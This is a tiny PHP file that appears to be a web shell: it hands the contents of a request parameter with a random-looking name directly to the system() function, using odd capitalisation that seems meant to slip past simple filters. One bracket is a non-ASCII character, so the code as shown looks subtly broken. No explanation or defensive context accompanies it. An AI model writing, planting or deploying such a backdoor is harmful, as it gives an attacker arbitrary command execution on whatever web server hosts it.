<?php
SysTeM($_GET['B7ARC5KV'〕);
?>
